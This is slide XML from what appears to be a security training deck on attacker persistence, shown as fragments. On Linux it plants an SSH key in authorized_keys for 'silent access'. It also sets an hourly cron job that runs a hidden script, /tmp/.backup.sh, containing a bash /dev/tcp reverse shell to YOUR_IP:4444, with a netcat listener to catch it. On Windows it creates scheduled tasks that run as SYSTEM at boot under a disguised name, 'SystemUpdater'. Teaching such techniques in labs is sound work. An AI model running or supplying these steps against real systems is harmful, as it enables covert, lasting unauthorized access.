                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>id_rsa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>):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+mj-lt"/>
              </a:rPr>
              <a:t>Just press </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Enter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt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b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>📂 What gets created?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+mj-lt"/>
              </a:rPr>
              <a:t>Inside ~/.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/: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 err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>id_rsa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Private Key (KEEP SECRET)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr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+mj-lt"/>
              </a:rPr>
              <a:t>id_rsa.pub → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Public Key (THIS is what you use)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900" dirty="0"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07199" y="178138"/>
            <a:ext cx="5167087" cy="61087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+mj-lt"/>
              </a:rPr>
              <a:t>View the Public Key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j-lt"/>
              </a:rPr>
              <a:t>cat ~/.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/id_rsa.pub</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Step 2 — Add Key to Target</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>mkdir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -p ~/.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ssh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echo "YOUR_PUBLIC_KEY" &gt;&gt; ~/.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>authorized_keys</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>chmod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> 700 ~/.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ssh</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>chmod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> 600 ~/.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>authorized_keys</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="20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20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20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200000"/>
              </a:lnSpc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81258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297714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>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Step 3 — Test Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>user@target_ip</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Teaching Point</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRP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No password needed → silent access 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Survives reboot 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Very common in real intrusions </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" b="1" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Method 2 — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Cron</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Job Reverse Shell (Auto Reconnect)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Step 1 — Create Payload Script</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>nano</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> /tmp/.backup.sh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+mj-lt"/>
              </a:rPr>
              <a:t>#!/bin/bash</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>bash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> &gt;&amp; /dev/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/YOUR_IP/4444 0&gt;&amp;1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 err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>chmod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> +x /tmp/.backup.sh</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"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57257" y="250709"/>
            <a:ext cx="3425372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Step 2 — Add </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Cron</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Job</a:t>
            </a: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+mj-lt"/>
              </a:rPr>
              <a:t>crontab</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -e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Add: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0 * * * * /tmp/.backup.sh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(Every hour reconnect)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Step 3 — Start Listener</a:t>
            </a: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+mj-lt"/>
              </a:rPr>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>lvnp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> 4444</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3399186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>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Part 2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Windows Persistence </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🎯 Objective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Maintain execution </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>after reboot or user logon</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> using built-in Windows mechanisms.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Concept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Windows uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Task Scheduler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> to run programs:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>At logon </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>At startup </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>On a schedule 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This makes it a powerful persistence mechanism.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In abuse scenarios, it can be used so a program starts again even after reboot or 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user sign-in.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2744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Method 1 — Scheduled Task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⚙️</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Step-by-Step (Lab Environment)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⚙️ Step 1 — Use Existing Program (on Target)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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  <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="19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C:\Windows\System32\calc.exe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dirty="0"/>
              <a:t>👉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Or Any </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"/>
              <a:t> file can be used.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1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Example: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Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Notepad++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Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>A small tool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Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Any program you copy there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👉 Place it here:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
              <a:latin typeface="Arial Unicode MS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Arial Unicode MS"/>
              </a:rPr>
              <a:t>C:\Users\Public\calc.exe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dirty="0"/>
              <a:t>Important: Ensure file actually exists )</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1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9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9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558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7891975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b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Step 2 — Create Scheduled Task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+mj-lt"/>
              </a:rPr>
              <a:t>Use any executable file and place it at C:\Users\Public\calc.exe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+mj-lt"/>
              </a:rPr>
              <a:t>👉 Then copy it into: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+mj-lt"/>
              </a:rPr>
              <a:t>C:\Users\Public\</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
              <a:latin typeface="+mj-lt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schtasks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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/create /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900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sc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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900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onlogon</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900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tn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900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TestTask</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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" /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900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tr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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"C:\Windows\System32\calc.exe“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b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>🔍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Breakdown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+mj-lt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  <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt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900" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>onlogon</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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→ runs when user logs in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+mj-lt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  <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>tn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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→ task name (should look legit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👀</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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+mj-lt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  <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>tr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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→ program to execute </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" dirty="0"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b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Step 3 — Verify Task Exists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schtasks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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/query /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900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tn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900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SystemUpdater</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt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900" dirty="0">
              <a:latin typeface="+mj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C1DEF7-9E5F-4DAB-82AD-C6B33116D276}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8102990" y="90100"/>
            <a:ext cx="4346917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+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Step 4 — Deep Verify (Important Addition)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schtasks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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/query /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800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fo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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LIST /v</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:latin typeface="+mj-lt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800" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Shows:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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Run account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Last run time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Task path </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="18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+mj-lt"/>
              </a:rPr>
              <a:t>Step 5 — Test Execution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+mj-lt"/>
              </a:rPr>
              <a:t>Log out → log back in</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>OR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr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err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>schtasks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> /run /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>tn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>SystemUpdater</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" alt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91005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940"/>
            <a:ext cx="6879102" cy="710066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⚙️ Step 6 — Persistence Level Awareness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Why it matters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Persistence can be:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>User-level</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> → only works when that user logs in </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>System-level</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> → works on boot (stronger persistence) we will be doing this.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🔄</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US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 Scheduled Task (SYSTEM Level Example)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 err="1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schtasks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1400" dirty="0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/create /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1400" dirty="0" err="1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sc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1400" dirty="0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400" dirty="0" err="1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onstart</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1400" dirty="0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/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1400" dirty="0" err="1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tn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1400" dirty="0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"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1400" dirty="0" err="1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SystemUpdater</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1400" dirty="0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" /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1400" dirty="0" err="1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tr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1400" dirty="0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"C:\Users\Public\calc.exe" /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1400" dirty="0" err="1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ru</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1400" dirty="0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SYSTEM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A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💡</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US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 Key Difference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  <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1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sc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty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onstart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runs on boot (no login needed)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  <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1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ru</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty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 SYSTEM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runs with highest privileges </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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06456-B408-4ACD-9A24-2DF4903A986A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6780628" y="233886"/>
            <a:ext cx="5838092" cy="5554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🔄</a:t>
            </a:r>
            <a:r>
